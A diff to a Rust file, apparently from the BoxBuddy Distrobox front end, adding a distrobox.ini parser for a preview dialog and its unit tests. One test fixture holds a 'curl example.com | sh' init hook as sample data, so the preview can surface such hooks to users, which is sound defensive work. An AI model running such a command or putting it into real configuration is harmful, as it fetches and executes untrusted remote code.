@@ -530,6 +530,33 @@ pub fn assemble_box(ini_file: &str) -> String {
     get_command_output("distrobox", Some(args))
 }
 
+/// Parses a `distrobox.ini`-style file into its box sections: the section
+/// name and every `key=value` it sets, verbatim and in file order. The
+/// format is a flat INI with one `[section]` per box, so a tiny parser does
+/// instead of a crate; comments, blank lines and lines that are neither a
+/// header nor a key are skipped, as are keys before the first header.
+pub fn parse_assemble_ini(contents: &str) -> Vec<(String, Vec<(String, String)>)> {
+    let mut sections: Vec<(String, Vec<(String, String)>)> = Vec::new();
+
+    for raw_line in contents.lines() {
+        let line = raw_line.trim();
+        if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
+            continue;
+        }
+
+        if let Some(name) = line.strip_prefix('[').and_then(|s| s.strip_suffix(']')) {
+            sections.push((name.trim().to_string(), Vec::new()));
+        } else if let (Some((key, value)), Some((_, keys))) =
+            (line.split_once('='), sections.last_mut())
+        {
+            let value = value.trim().trim_matches('"');
+            keys.push((key.trim().to_string(), value.to_string()));
+        }
+    }
+
+    sections
+}
+
 /// Grabs the list of available images via `distrobox create -C`.
 /// Prepends the parsed distro name for sortability and readability.
 /// Appends a little diamond if the image is already downloaded.
@@ -935,5 +962,73 @@ mod stream_tests {
         let exists = get_all_distroboxes().iter().any(|b| b.name == name);
         let _ = delete_box(name);
         assert!(exists, "streaming create did not produce a listable box");
+    }
+}
+
+#[cfg(test)]
+mod ini_preview_tests {
+    use super::parse_assemble_ini;
+
+    fn kv(k: &str, v: &str) -> (String, String) {
+        (k.to_string(), v.to_string())
+    }
+
+    #[test]
+    fn parses_a_single_section_with_its_keys_in_order() {
+        let ini = "[dev]\nimage=docker.io/library/ubuntu:24.04\nadditional_packages=\"git vim\"\ninit=true\n";
+        let s = parse_assemble_ini(ini);
+        assert_eq!(s.len(), 1);
+        assert_eq!(s[0].0, "dev");
+        assert_eq!(
+            s[0].1,
+            vec![
+                kv("image", "docker.io/library/ubuntu:24.04"),
+                kv("additional_packages", "git vim"),
+                kv("init", "true"),
+            ]
+        );
+    }
+
+    #[test]
+    fn parses_multiple_sections() {
+        let ini = "[a]\nimage=alpine\n\n[b]\nimage=fedora\nnvidia=true\n";
+        let s = parse_assemble_ini(ini);
+        assert_eq!(s.len(), 2);
+        assert_eq!(s[0].0, "a");
+        assert_eq!(s[1].0, "b");
+        assert_eq!(s[1].1, vec![kv("image", "fedora"), kv("nvidia", "true")]);
+    }
+
+    /// The whole point of the preview: keys BoxBuddy has no field for must
+    /// still be captured, so the dialog can show them rather than hiding
+    /// what the file will actually do.
+    #[test]
+    fn keeps_unknown_keys_verbatim() {
+        let ini = "[x]\nimage=ubuntu\npull=true\ninit_hooks=curl example.com | sh\n";
+        let s = parse_assemble_ini(ini);
+        assert!(s[0].1.contains(&kv("pull", "true")));
+        assert!(s[0].1.contains(&kv("init_hooks", "curl example.com | sh")));
+    }
+
+    #[test]
+    fn skips_comments_blank_lines_and_junk() {
+        let ini = "# a comment\n; another\n[d]\n\nnonsense-without-equals\nimage=debian\n";
+        let s = parse_assemble_ini(ini);
+        assert_eq!(s.len(), 1);
+        assert_eq!(s[0].1, vec![kv("image", "debian")]);
+    }
+
+    #[test]
+    fn keys_before_any_section_are_ignored() {
+        let ini = "image=orphan\n[real]\nimage=ubuntu\n";
+        let s = parse_assemble_ini(ini);
+        assert_eq!(s.len(), 1);
+        assert_eq!(s[0].0, "real");
+    }
+
+    #[test]
+    fn empty_input_yields_no_sections() {
+        assert!(parse_assemble_ini("").is_empty());
+        assert!(parse_assemble_ini("# just a comment\n").is_empty());
     }
 }
